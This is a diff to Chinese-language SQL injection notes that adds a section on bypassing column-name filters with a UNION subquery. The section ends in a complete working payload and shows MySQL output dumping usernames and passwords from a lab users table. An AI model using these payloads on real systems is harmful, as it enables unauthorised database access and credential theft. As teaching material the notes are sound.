@@ -1203,7 +1203,7 @@ ERROR 1105 (HY000): XPATH syntax error: '~security'
 >   只能使用`substring()`、`substr()`、`left()`、`right()`、`regexp()`等函数分批次获取：？？？？？？？？？？TODO：？？？
 >
 >   ```
->                 
+>                   
 >   ```
 >
 >   
@@ -1470,21 +1470,21 @@ Runtime error: integer overflow
 >   +-------------------------+
 >   |     9223372036854776000 |
 >   +-------------------------+
->               
+>                 
 >   mysql> select abs(0x8000000000000000);
 >   +-------------------------+
 >   | abs(0x8000000000000000) |
 >   +-------------------------+
 >   |     9223372036854776000 |
 >   +-------------------------+
->               
+>                 
 >   mysql> select abs(0x7fffffffffffffff + 1);
 >   +-----------------------------+
 >   | abs(0x7fffffffffffffff + 1) |
 >   +-----------------------------+
 >   |         9223372036854776000 |
 >   +-----------------------------+
->               
+>                 
 >   mysql> select abs(0xFFFFFFFFFFFFFFFF);
 >   +-------------------------+
 >   | abs(0xFFFFFFFFFFFFFFFF) |
@@ -2105,6 +2105,82 @@ https://dba.stackexchange.com/questions/54608/innodb-error-table-mysql-innodb-ta
 ？？？？？？找不到这张表TODO：？？？？？？？？
 
 https://www.cnblogs.com/upfine/p/16496021.html
+
+## §4.9 绕过列名
+
+假设`users`表内含有`id`、`username`、`password`这三列，SQL语句为`select * from users where username=$username`，但是`$username`过滤了这三个列名，所以我们不能再`' and 1=0 union select group_concat('password'),2,3`。
+
+### §4.9.1 子查询创建新列名
+
+当我们使用SELECT子句且未指定FROM子句的时候，SQL将会把列名也作为这一列的内容：
+
+```sql
+mysql> select 'abc',123,000;
+    +-----+-----+-----+
+    | abc | 123 | 000 |
+    +-----+-----+-----+
+    | abc | 123 |   0 |
+    +-----+-----+-----+
+    1 row in set (0.00 sec)
+```
+
+在保证列数相同的前提下，使用UNION子句不会改变返回结果的列名。为了过滤掉第一行无用的数据，我们使用LIMIT或OFFSET子句：
+
+```sql
+mysql> select 'abc',123,000 union select * from users;
+    +-----+----------+-------+
+    | abc | 123      | 000   |
+    +-----+----------+-------+
+    | abc | 123      | 0     |
+    | 1   | Dumb     | admin |
+    | 2   | Angelina | root  |
+    +-----+----------+-------+
+    3 rows in set (0.00 sec)
+    
+mysql> select 'abc',123,000 union select * from users limit 1,999999; # 过滤第0行,取后续足够多的行
+    +-----+----------+-------+
+    | abc | 123      | 000   |
+    +-----+----------+-------+
+    | 1   | Dumb     | admin |
+    | 2   | Angelina | root  |
+    +-----+----------+-------+
+    2 rows in set (0.00 sec)
+    
+mysql> select 'abc',123,000 union select * from users limit 999999 offset 1; # 从1行开始，后取足够多的行
+    +-----+----------+-------+
+    | abc | 123      | 000   |
+    +-----+----------+-------+
+    | 1   | Dumb     | admin |
+    | 2   | Angelina | root  |
+    +-----+----------+-------+
+    2 rows in set (0.00 sec)
+```
+
+这里我们已经拿到了想要的数据，并且绕过了列名。接下来需要将这次的返回结果作为子查询，由外层的SELECT子句筛选我们想要的值：
+
+```mysql
+mysql> select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;
+	# 必须给子查询指定别名，这里用的别名是a，否则报错：ERROR 1248 (42000): Every derived table must have its own alias
+	# group_concat调用数字类型的列名时必须加反引号进行转置，否则列名会被解析成数字字符串，而不是对应的列
+    +-------------------+---------------------+------------------------+
+    | group_concat(abc) | group_concat(`123`) | group_concat(`000`)    |
+    +-------------------+---------------------+------------------------+
+    | 1,2               | Dumb,Angelina       | admin,root             |
+    +-------------------+---------------------+------------------------+
+    1 row in set (0.00 sec)
+```
+
+最终构造Payload：`' and 1=0 union select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;# `
+
+```sql
+mysql> select * from users where username='' and 1=0 union select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;
+    +-------------------+---------------------+------------------------+
+    | group_concat(abc) | group_concat(`123`) | group_concat(`000`)    |
+    +-------------------+---------------------+------------------------+
+    | 1,2               | Dumb,Angelina       | admin,root             |
+    +-------------------+---------------------+------------------------+
+    1 row in set (0.00 sec)
+```
 
 # §5 PHP与SQL的综合Bypass
 
